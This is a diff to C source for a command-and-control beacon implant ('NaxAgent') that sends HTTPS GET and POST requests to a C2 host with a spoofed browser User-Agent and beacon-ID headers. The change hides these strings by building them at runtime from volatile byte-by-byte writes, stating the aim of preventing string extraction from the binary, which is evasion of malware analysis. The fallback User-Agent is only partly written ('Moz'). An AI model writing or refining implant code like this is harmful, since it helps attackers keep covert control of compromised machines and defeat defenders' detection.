@@ -32,15 +32,42 @@
 #endif
 
 /* ===== compile-time defaults ===== */
-#ifndef NAX_HTTP_URI_GET
-#  define NAX_HTTP_URI_GET  "/news/feed"
+/* Pre-profile URIs, headers, and UA are built at runtime from volatile
+ * writes (nax_config.h) to prevent string extraction from the binary.
+ * Initialized once in nax_https_init_strings(). */
+char g_uri_get[64];
+char g_uri_post[64];
+static char g_user_agent[256];
+char g_beacon_hdr[32];
+char g_public_hdr[32];
+static int  g_strings_init = 0;
+
+static void nax_https_init_strings(void) {
+    if (g_strings_init) return;
+    g_strings_init = 1;
+
+#ifdef NAX_URI_GET_WRITE
+    { volatile char *p = (volatile char *)g_uri_get;    NAX_URI_GET_WRITE(p);    }
+    { volatile char *p = (volatile char *)g_uri_post;   NAX_URI_POST_WRITE(p);   }
+    { volatile char *p = (volatile char *)g_user_agent; NAX_UA_WRITE(p);         }
+    { volatile char *p = (volatile char *)g_beacon_hdr; NAX_BEACON_HDR_WRITE(p); }
+    { volatile char *p = (volatile char *)g_public_hdr; NAX_PUBLIC_HDR_WRITE(p); }
+#else
+    g_uri_get[0]='/';g_uri_get[1]='n';g_uri_get[2]='e';g_uri_get[3]='w';
+    g_uri_get[4]='s';g_uri_get[5]='/';g_uri_get[6]='f';g_uri_get[7]='e';
+    g_uri_get[8]='e';g_uri_get[9]='d';
+    g_uri_post[0]='/';g_uri_post[1]='a';g_uri_post[2]='p';g_uri_post[3]='i';
+    g_uri_post[4]='/';g_uri_post[5]='s';g_uri_post[6]='u';g_uri_post[7]='b';
+    g_uri_post[8]='m';g_uri_post[9]='i';g_uri_post[10]='t';
+    g_beacon_hdr[0]='X';g_beacon_hdr[1]='-';g_beacon_hdr[2]='B';g_beacon_hdr[3]='e';
+    g_beacon_hdr[4]='a';g_beacon_hdr[5]='c';g_beacon_hdr[6]='o';g_beacon_hdr[7]='n';
+    g_beacon_hdr[8]='-';g_beacon_hdr[9]='I';g_beacon_hdr[10]='d';
+    g_public_hdr[0]='X';g_public_hdr[1]='-';g_public_hdr[2]='N';g_public_hdr[3]='a';
+    g_public_hdr[4]='X';g_public_hdr[5]='-';g_public_hdr[6]='P';g_public_hdr[7]='u';
+    g_public_hdr[8]='b';g_public_hdr[9]='l';g_public_hdr[10]='i';g_public_hdr[11]='c';
+    g_user_agent[0]='M';g_user_agent[1]='o';g_user_agent[2]='z';
 #endif
-#ifndef NAX_HTTP_URI_POST
-#  define NAX_HTTP_URI_POST "/api/submit"
-#endif
-#ifndef NAX_HTTP_UA
-#  define NAX_HTTP_UA       "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
-#endif
+}
 #ifndef NAX_C2_PORT
 #  define NAX_C2_PORT       443
 #endif
@@ -424,23 +451,24 @@ static uint8_t *https_post(NaxAgent *a,
                                              meta_enc, meta_len,
                                              0 /*POST*/, hdrs, sizeof(hdrs));
     } else {
-        /* Pre-profile: beacon ID in X-Beacon-Id, Content-Type, X-NaX-Public */
+        /* Pre-profile: headers built from volatile strings */
         hdr_len = (uint32_t)snprintf(hdrs, sizeof(hdrs),
-            "X-Beacon-Id: %s\r\n"
+            "%s: %s\r\n"
             "Content-Type: application/octet-stream\r\n"
-            "X-NaX-Public: 1\r\n"
+            "%s: 1\r\n"
             "Content-Length: %u\r\n",
-            a->session_id, send_len);
+            g_beacon_hdr, a->session_id,
+            g_public_hdr, send_len);
     }
 
-    const char *uri = profile_active ? nax_profile_post_uri_rotate() : NAX_HTTP_URI_POST;
+    const char *uri = profile_active ? nax_profile_post_uri_rotate() : g_uri_post;
     const char *req_host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
     char req[512];
     int req_len = snprintf(req, sizeof(req),
         "POST %s HTTP/1.1\r\n"
         "Host: %s\r\n"
-        "User-Agent: " NAX_HTTP_UA "\r\n",
-        uri, req_host);
+        "User-Agent: %s\r\n",
+        uri, req_host, g_user_agent);
 
     /* Content-Length header — required for POST body, not added by nax_build_request_headers */
     char clen_hdr[64];
@@ -499,8 +527,8 @@ static uint8_t *https_get(NaxAgent *a,
     int req_len = snprintf(req, sizeof(req),
         "GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
-        "User-Agent: " NAX_HTTP_UA "\r\n",
-        uri, host);
+        "User-Agent: %s\r\n",
+        uri, host, g_user_agent);
 
     pthread_mutex_lock(&g_https_mutex);
     uint8_t *resp = NULL;
@@ -743,6 +771,7 @@ static void nax_https_drain_async(NaxAgent *a) {
 
 void nax_https_main(NaxAgent *a)
 {
+    nax_https_init_strings();
     signal(SIGPIPE, SIG_IGN);
     gen_session_id(a->session_id);
     nax_bof_sdk_init();
